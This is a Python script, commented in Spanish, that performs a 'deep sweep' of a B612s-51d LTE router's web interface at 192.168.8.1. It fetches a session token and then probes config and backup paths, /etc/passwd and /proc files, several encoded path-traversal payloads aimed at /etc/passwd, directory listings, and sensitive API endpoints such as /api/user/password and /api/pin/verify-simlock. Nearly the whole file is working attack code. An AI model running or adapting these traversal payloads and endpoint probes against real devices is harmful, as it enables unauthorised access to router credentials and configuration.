#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Barrido profundo del servidor web del B612s-51d: configs, traversal, listings."""
import urllib.request, urllib.error

HOST = "192.168.8.1"

def raw(path, cookie=None, token=None):
    headers = {"User-Agent":"Mozilla/5.0","Accept-Encoding":"identity"}
    if cookie: headers["Cookie"] = cookie
    if token: headers["__RequestVerificationToken"] = token
    req = urllib.request.Request(f"http://{HOST}{path}", headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=6) as r:
            return r.status, r.read(2000)
    except urllib.error.HTTPError as e:
        return e.code, e.read(500)
    except Exception as e:
        return None, str(e).encode()

def desc(tipo, path, cookie=None, token=None):
    st, data = raw(path, cookie, token)
    head = data[:160]
    # gzip?
    import gzip
    if head[:2] == b"\x1f\x8b":
        try: head = gzip.decompress(data)[:200]
        except Exception: pass
    if st is not None and st != 404 and (st != 200 or len(data) > 0):
        if len(head) > 60: head = head[:60]
        print(f"{tipo:22} {path:45} -> {st}  {head!r}")

_, b = raw("/api/webserver/SesTokInfo")
b = b.decode("utf-8","replace")
c = "SessionID=" + b.split("<SesInfo>")[1].split("</SesInfo>")[0].strip()
t = b.split("<TokInfo>")[1].split("</TokInfo>")[0].strip()

print("===== 1) ARCHIVOS DE CONFIG REFERENCIADOS / CONOCIDOS =====")
for p in ["/config/global/config.xml", "/config/config.xml", "/config.xml",
          "/backupsettings.conf", "/backup", "/backup/", "/config/", "/config",
          "/version", "/version.txt", "/VERSION", "/html/version.xml",
          "/etc/config.xml", "/etc/passwd", "/proc/version", "/proc/cpuinfo"]:
    desc("CONFIG", p, c, t)

print("\n===== 2) PATH TRAVERSAL =====")
for p in ["/html/../../../../etc/passwd", "/../../../../etc/passwd",
          "/..%2f..%2f..%2f..%2fetc%2fpasswd", "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
          "/html/..%252f..%252fetc%252fpasswd", "/config/../../etc/passwd",
          "/js/../../../../etc/passwd", "/html/%2e%2e/%2e%2e/etc/passwd",
          "/html/..;/..;/..;/etc/passwd", "/static/../../etc/passwd"]:
    desc("TRAV", p)

print("\n===== 3) LISTINGS DE DIRECTORIOS =====")
for p in ["/html/", "/js/", "/lib/", "/res/", "/css/", "/", "/config/", "/images/", "/xml/"]:
    desc("LIST", p)

print("\n===== 4) APIS PROFUNDAS (patrones no vistos en JS) =====")
for p in ["/api/device/control", "/api/device/mode", "/api/device/state",
          "/api/global/config", "/api/global/deviceinfo", "/api/global/hilink",
          "/api/security/state", "/api/security/firewall", "/api/ntwk/lte_info",
          "/api/ntwk/plmn", "/api/net/status", "/api/dialup/connection",
          "/api/dialup/state", "/api/cradle/status-info", "/api/user/password",
          "/api/user/login-state", "/api/wlan/status", "/api/webserver/publickey",
          "/api/monitoring/syslog", "/api/syslog", "/api/upgrade/state",
          "/api/pin/verify-simlock"]:
    desc("API", p, c, t)

print("\n===== 5) VERSION / ESTADO INTERNO =====")
for p in ["/html/version.xml", "/api/device/information", "/api/device/basic_information",
          "/api/monitoring/status", "/api/online-update/status"]:
    desc("VER", p, c, t)

print("\nFIN DEL BARRIDO PROFUNDO")
